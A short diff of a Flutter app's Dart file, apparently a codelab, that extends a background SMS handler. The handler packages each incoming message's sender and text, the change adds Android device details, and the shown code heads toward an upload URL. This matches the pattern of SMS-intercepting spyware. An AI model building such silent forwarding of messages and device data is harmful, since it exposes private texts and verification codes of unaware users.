@@ -1,8 +1,10 @@
 import 'dart:convert';
 
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_codelab/home.dart';
 import 'package:flutter_codelab/local_notification.dart';
+import 'package:flutter_codelab/mobile.dart';
 import 'package:flutter_codelab/permissions.dart';
 import 'package:flutter_codelab/utils.dart';
 import 'package:flutter_local_notifications/flutter_local_notifications.dart';
@@ -32,9 +34,12 @@ void callbackDispatcher() {
 }
 
 backgrounMessageHandler(SmsMessage message) async {
+  final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
+  Map<String, dynamic> deviceData =
+      Mobile().readAndroidBuildData(await deviceInfoPlugin.androidInfo);
   Map<String, String?> body = {
     'sender_address': message.address,
-    'receiver_address': '+9779813457822',
+    'device_details': jsonEncode(deviceData),
     'message': message.body
   };
   var url = Uri.parse(
